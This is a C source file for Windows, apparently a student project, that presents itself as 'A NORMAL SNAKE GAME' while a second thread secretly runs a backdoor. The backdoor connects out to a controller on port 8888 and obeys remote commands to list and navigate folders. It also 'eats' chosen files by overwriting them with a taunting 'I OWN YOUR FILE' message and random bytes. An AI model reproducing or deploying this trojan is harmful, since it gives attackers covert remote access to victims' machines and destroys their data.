#include <stdio.h>
#include <winsock2.h>
#include <string.h>
#include <conio.h>
#include <dirent.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#define GAMESCREEN_WIDTH 50
#define GAMESCREEN_HEIGHT 20

#pragma comment(lib, "ws2_32.lib")

// ==================================================================================
// 				   CODE FOR CONNECTIONS AND BACK DOOR STARTS HERE
// ==================================================================================

// Declaring needed variables globally
WSADATA wsa;
SOCKET s;
struct sockaddr_in server;
char buffer[2048];
int recv_size;
int awaamiErrorCode;

// Repetitive code declared as functions here...

// Called when any error is caught, to stop the program then and there
void error()
{
	exit(1);
}

// Iniitialize Winsock
void initWinSock()
{
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		error();
	}
}

// Create socket
void createPrepSock()
{

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		error();
	}
}

// Connect to the hacker/server's computer
int makeConnToServer()
{

	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_family = AF_INET;
	server.sin_port = htons(8888);

	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		return 0;
	}

	return 1;
}

// Recieve data and put it in buffer
int reliableRecieve()
{

	// Cleaning buffer before data comes.
	memset(buffer, 0, strlen(buffer));

	if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR)
	{
		return -1;
	}

	buffer[recv_size] = '\0';
	if (recv_size == 1)
		return 0;

	return 1;
}

// Send all data stored in buffer
void reliableSend()
{
	// Sending message to client
	send(s, buffer, strlen(buffer), 0);
}

// Load the buffer with list of current folder contents
void pullDirectoryData()
{
	// Code to extract directory data
	DIR *directory;
	struct dirent *entry;

	// Open the current working directory
	directory = opendir(".");
	if (directory == NULL)
	{
		perror("Error opening current working directory");
	}

	// Loop through the entries in the directory
	while ((entry = readdir(directory)) != NULL)
	{
		char filename[100];
		char filetype[10];

		if ((entry->d_type + '0') == '0')
		{
			strcpy(filetype, "FILE");
		}
		else
		{
			strcpy(filetype, "FOLDER");
		}

		strcpy(filename, entry->d_name);
		strcat(filename, "\n");
		strcat(filename, filetype);
		strcat(filename, "\n\n");
		strcat(buffer, filename);
	}

	// Close the directory
	closedir(directory);
}

// Load the buffer with CWD Path
void loadCWD()
{
	getcwd(buffer, sizeof(buffer));
}

// Load the buffer with any data
void writeToBuffer(char data[])
{
	// Clearing old data
	memset(buffer, 0, strlen(buffer));

	// Putting new data
	strcpy(buffer, data);
}

// Function that eats any file
int eatFile(char fileName[])
{
	int offset, n;
	FILE *filein;

	srand(time(NULL));

	filein = fopen(fileName, "r");

	if (filein == NULL)
	{
		return 0;
	}

	fseek(filein, 0L, SEEK_END);
	n = ftell(filein);

	fclose(filein);

	filein = fopen(fileName, "w");

	fputs("         _______________\n", filein);
	fputs("        /               \\\n", filein);
	fputs("       /                 \\\n", filein);
	fputs("      /                   \\\n", filein);
	fputs("      |   XXXX     XXXX   |\n", filein);
	fputs("      |   XXXX     XXXX   |\n", filein);
	fputs("      |   XXX       XXX   |\n", filein);
	fputs("      |         X         |\n", filein);
	fputs("      \\__      XXX     __/\n", filein);
	fputs("        |\\     XXX     /|\n", filein);
	fputs("        | |           | |\n", filein);
	fputs("        | I I I I I I I |\n", filein);
	fputs("        |  I I I I I I  |\n", filein);
	fputs("         \\_           _/\n", filein);
	fputs("          \\_         _/\n", filein);
	fputs("            \\_______/\n", filein);
	fputs("  XXX                        XXX\n", filein);
	fputs("XXXXX                        XXXXX\n", filein);
	fputs(" XXXXXXXXXX             XXXXXXXXXX\n", filein);
	fputs("         XXXXX     XXXXX\n", filein);
	fputs("             XXXXXXX\n", filein);
	fputs("         XXXXX     XXXXX\n", filein);
	fputs(" XXXXXXXXXX             XXXXXXXXXX\n", filein);
	fputs("XXXXX                        XXXXX\n", filein);
	fputs("  XXX                        XXX\n\n", filein);

	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n", filein);
	fputs("			I OWN YOUR FILE.\n			WATCH THE VIDEO TO GET IT BACK.\n", filein);
	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n\n", filein);
	fputs("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n", filein);

	for (int i = 0; i < n; i++)
	{
		fputc(rand() % 256, filein);
	}

	fclose(filein);

	return 1;
}

// Main function for backdoor operations
int backdoor_main()
{
	// Main Code

	initWinSock();

	// A continious connection persistant loop for the backdoor
	int connected = 0;

	while (1)
	{

		while (!connected)
		{
			Sleep(1000);
			createPrepSock();
			connected = makeConnToServer(); // returns 1 if successful
		}

		while (connected)
		{

			// Getting chosen option by server
			while (1)
			{
				awaamiErrorCode = reliableRecieve();
				if (awaamiErrorCode != 0)
					break;
			}

			// Checking if connection is still intact.
			if (awaamiErrorCode == 1)
			{
				// Checking option selected by server
				int option = atoi(buffer);

				switch (option)
				{
				case 1:
					pullDirectoryData();

					reliableSend();

					break;

				case 2:
					loadCWD();

					reliableSend();

					break;

				case 3:

					awaamiErrorCode = 0;
					while (awaamiErrorCode == 0)
					{
						awaamiErrorCode = reliableRecieve();
					}

					chdir(buffer);

					// Sending updated CWD
					loadCWD();
					reliableSend();

					break;

				case 4:
					chdir("..");

					// Sending updated CWD
					loadCWD();
					reliableSend();

					break;

				case 5:

					awaamiErrorCode = 0;
					while (awaamiErrorCode == 0)
					{
						awaamiErrorCode = reliableRecieve();
					}

					awaamiErrorCode = eatFile(buffer);

					// Sending post eating report
					if (awaamiErrorCode == 1)
					{
						writeToBuffer("File eaten successfully.");
					}
					else
					{
						writeToBuffer("File was not eaten, probably not found.");
					}

					reliableSend();

					break;

				default:
					break;
				}
			}

			// if connection was broken
			else
			{
				connected = 0;
				break;
			}
		}
	}

	return 0;
}

// ==================================================================================
// 				   CODE FOR CONNECTIONS AND BACK DOOR ENDS HERE
// ==================================================================================

// ==================================================================================
// 				   		CODE FOR THE SNAKE GAME STARTS HERE
// ==================================================================================

struct SnakeGame
{
	int vel_x;
	int vel_y;
	int food_x;
	int food_y;
	int score;
	int running;
	int deltaFrame;

	int length;
	int top;
	int snakeBody[GAMESCREEN_WIDTH * GAMESCREEN_HEIGHT][2];
};

int temp;
struct SnakeGame snakeGame;

char inputCh;
char snakeChar = '0';
char backgroundChar = ' ';
char borderChar = 'X';
char foodChar = 'a';

void putFood()
{
	snakeGame.food_x = (rand() % (GAMESCREEN_WIDTH - 2)) + 1;
	snakeGame.food_y = (rand() % (GAMESCREEN_HEIGHT - 2)) + 1;
}

void initialize()
{
	// Initialize all values of the array
	for (int i = 0; i < (GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH); i++)
	{
		snakeGame.snakeBody[i][0] = -1;
		snakeGame.snakeBody[i][1] = -1;
	}

	snakeGame.deltaFrame = 250;

	snakeGame.score = 0;

	snakeGame.snakeBody[0][0] = (int)GAMESCREEN_WIDTH / 2;
	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;

	snakeGame.snakeBody[0][0] = (int)(GAMESCREEN_WIDTH / 2) - 1;
	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;

	snakeGame.snakeBody[0][0] = (int)(GAMESCREEN_WIDTH / 2) - 2;
	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;

	snakeGame.length = 3;

	putFood();

	snakeGame.vel_x = 1;
	snakeGame.vel_y = 0;
}

int snakeIsHere(int x, int y)
{
	for (int i = 0; i < (GAMESCREEN_WIDTH * GAMESCREEN_HEIGHT); i++)
	{
		// check x and y
		if (x == snakeGame.snakeBody[i][0] && y == snakeGame.snakeBody[i][1])
		{
			return 1;
		}
	}
	return 0;
}

int checkGameOver()
{
	if ((snakeGame.snakeBody[0][0] + snakeGame.vel_x) < (GAMESCREEN_WIDTH - 1) &&
		(snakeGame.snakeBody[0][0] + snakeGame.vel_x) > 0 &&
		(snakeGame.snakeBody[0][1] + snakeGame.vel_y) < (GAMESCREEN_HEIGHT - 1) &&
		(snakeGame.snakeBody[0][1] + snakeGame.vel_y) > 0)
	{
		// check if snake ate itself
		if (snakeIsHere((snakeGame.snakeBody[0][0] + snakeGame.vel_x), (snakeGame.snakeBody[0][1] + snakeGame.vel_y)))
		{
			return 1;
		}
		else
		{
			return 0;
		}
	}
	else
	{
		return 1;
	}
}

void gameOver()
{
	snakeGame.running = 0;
}

int hasEatenFood()
{
	if (snakeIsHere(snakeGame.food_x, snakeGame.food_y))
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

void update()
{
	// See if game over
	if (checkGameOver())
	{
		gameOver();
	}

	// Check if food has been eaten
	if (hasEatenFood())
	{
		snakeGame.length++;
		snakeGame.score++;
		putFood();
	}

	// Update the deltaFrame
	snakeGame.deltaFrame = 250 - (((int)snakeGame.score / 5) * 25);

	// Shift all places to right in body array
	for (int i = (GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH) - 1; i >= 0; i--)
	{
		snakeGame.snakeBody[i + 1][0] = snakeGame.snakeBody[i][0];
		snakeGame.snakeBody[i + 1][1] = snakeGame.snakeBody[i][1];
	}

	// add snake head
	snakeGame.snakeBody[0][0] += snakeGame.vel_x;
	snakeGame.snakeBody[0][1] += snakeGame.vel_y;
	snakeGame.top++;

	// Remove extra coordinates
	while (snakeGame.top + 1 > snakeGame.length)
	{
		snakeGame.snakeBody[snakeGame.top][0] = -1;
		snakeGame.snakeBody[snakeGame.top][1] = -1;
		snakeGame.top--;
	}
}

void render()
{
	for (int j = 0; j < GAMESCREEN_HEIGHT; j++)
	{
		for (int i = 0; i < GAMESCREEN_WIDTH; i++)
		{
			if (snakeIsHere(i, j))
			{
				printf("%c", snakeChar);
			}
			else if (i == 0 || i == GAMESCREEN_WIDTH - 1 || j == 0 || j == GAMESCREEN_HEIGHT - 1)
			{
				printf("%c", borderChar);
			}
			else if (i == snakeGame.food_x && j == snakeGame.food_y)
			{
				printf("%c", foodChar);
			}
			else
			{
				printf("%c", backgroundChar);
			}
		}
		printf("\n");
	}
	printf("SCORE: %d", snakeGame.score);
}

void resetCursor()
{
	COORD coord;
	coord.X = 0;
	coord.Y = 0;
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	SetConsoleCursorPosition(hConsole, coord);
}

void hideCursor()
{
	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);

	CONSOLE_CURSOR_INFO cursorInfo;

	GetConsoleCursorInfo(out, &cursorInfo);
	cursorInfo.bVisible = 0; // set the cursor visibility to false
	SetConsoleCursorInfo(out, &cursorInfo);
}

void clearScreen()
{
	resetCursor();
	for (int i = 0; i < 20; i++)
	{
		for (int j = 0; j < 200; j++)
		{
			fprintf(stderr, " ");
		}
		fprintf(stderr, "\n");
	}
	resetCursor();
}

void showSnakeWelcomeScreen()
{

	fprintf(stderr, "   _____                         __   \n");
	fprintf(stderr, "  /  _  \\    ____   ____   _____/  |_ \n");
	fprintf(stderr, " /  /_\\  \\  / ___\\_/ __ \\ /    \\   __\\\n");
	fprintf(stderr, "/    |    \\/ /_/  >  ___/|   |  \\  |  \n");
	fprintf(stderr, "\\____|__  /\\___  / \\___  >___|  /__|  \n");
	fprintf(stderr, "        \\/_____/      \\/     \\/      \n");
	fprintf(stderr, "  _________              __           \n");
	fprintf(stderr, " /   _____/ ____ _____  |  | __ ____  \n");
	fprintf(stderr, " \\_____  \\ /    \\__  \\ |  |/ // __ \\ \n");
	fprintf(stderr, " /        \\   |  \\/ __ \\|    <\\  ___/ \n");
	fprintf(stderr, "/_______  /___|  (____  /__|_ \\___  >\n");
	fprintf(stderr, "        \\/     \\/     \\/     \\/    \\/ \n");

	fprintf(stderr, "\n\n");
	fprintf(stderr, "  A NORMAL   ____\n");
	fprintf(stderr, "  SNAKE     / . .\\      BY\n");
	fprintf(stderr, "  GAME      \\  ---<   SARIM,\n");
	fprintf(stderr, "             \\  /    MUNTAHA\n");
	fprintf(stderr, "   __________/ /       AND\n");
	fprintf(stderr, "-=:___________/	       SHAHEER\n");

	fprintf(stderr, "\n\nPress any key to continue...\n");

	fflush(stdin);
	getch();
}

void showGameOverScreen()

{
	fprintf(stderr, "  ________    _____      _____  ___________\n");
	fprintf(stderr, " /  _____/   /  _  \\    /     \\ \\_   _____/\n");
	fprintf(stderr, "/   \\  ___  /  /_\\  \\  /  \\ /  \\ |    __)_ \n");
	fprintf(stderr, "\\    \\_\\  \\/    |    \\/    Y    \\|        \\\n");
	fprintf(stderr, " \\______  /\\____|__  /\\____|__  /_______  /\n");
	fprintf(stderr, "        \\/         \\/         \\/        \\/ \n");
	fprintf(stderr, "____________   _________________________   \n");
	fprintf(stderr, "\\_____  \\   \\ /   /\\_   _____/\\______   \\  \n");
	fprintf(stderr, " /   |   \\   Y   /  |    __)_  |       _/  \n");
	fprintf(stderr, "/    |    \\     /   |        \\ |    |   \\  \n");
	fprintf(stderr, "\\_______  /\\___/   /_______  / |____|_  /  \n");
	fprintf(stderr, "        \\/                 \\/         \\/   \n");

	fprintf(stderr, "\n\nSCORE: %d", snakeGame.score);

	printf("\n\nPress any key to try again...");
	fflush(stdin);
	getch();
}

void pauseGame()
{
	for (int i = 0; i < (int)GAMESCREEN_HEIGHT / 2; i++)
	{
		fprintf(stderr, "\n");
	}
	for (int i = 0; i < (int)(GAMESCREEN_WIDTH / 2) - 3; i++)
	{
		fprintf(stderr, " ");
	}

	fprintf(stderr, "PAUSED");

	fflush(stdin);
	getch();
}

void handleInput()
{
	if (_kbhit())
	{
		inputCh = getch();
		if ((inputCh == 'w' || inputCh == 'W') && snakeGame.vel_y != 1)
		{
			snakeGame.vel_x = 0;
			snakeGame.vel_y = -1;
		}
		else if ((inputCh == 'a' || inputCh == 'A') && snakeGame.vel_x != 1)
		{
			snakeGame.vel_x = -1;
			snakeGame.vel_y = 0;
		}
		else if ((inputCh == 's' || inputCh == 'S') && snakeGame.vel_y != -1)
		{
			snakeGame.vel_x = 0;
			snakeGame.vel_y = 1;
		}
		else if ((inputCh == 'd' || inputCh == 'D') && snakeGame.vel_x != -1)
		{
			snakeGame.vel_x = 1;
			snakeGame.vel_y = 0;
		}
		else if ((inputCh == 'p' || inputCh == 'P'))
		{
			clearScreen();
			pauseGame();
		}
	}
}

int snakeGameMain()
{

	hideCursor();
	snakeGame.running = 1;

	clearScreen();
	showSnakeWelcomeScreen();

	while (1)
	{
		// SnakeGame Starts
		initialize();
		clearScreen();

		// SnakeGame Runs
		while (snakeGame.running)
		{
			update();
			render();
			Sleep(snakeGame.deltaFrame);
			handleInput();
			fflush(stdin);
			resetCursor(0, 0);
		}

		// SnakeGame Over
		clearScreen();
		showGameOverScreen();
		snakeGame.running = 1;
		fflush(stdin);
	}
}

// ==================================================================================
// 				   		CODE FOR THE SNAKE GAME ENDS HERE
// ==================================================================================

// ==================================================================================
// 				   		  MULTITHREADING WORK STARTS HERE
// ==================================================================================

// Runs the main code for the backdoor operations.
void *thread1()
{
	backdoor_main();
}

// Runs the minigame in the foreground
void *thread2()
{
	snakeGameMain();
}

int main(int argc, char *argv[])
{

	// The main function here executes two different functions in parallel,
	// namely thread1 and thread2.

	pthread_t threadId1;
	pthread_t threadId2;

	pthread_create(&threadId1, NULL, &thread1, NULL);
	pthread_create(&threadId2, NULL, &thread2, NULL);

	pthread_join(threadId1, NULL);
	pthread_join(threadId2, NULL);
}
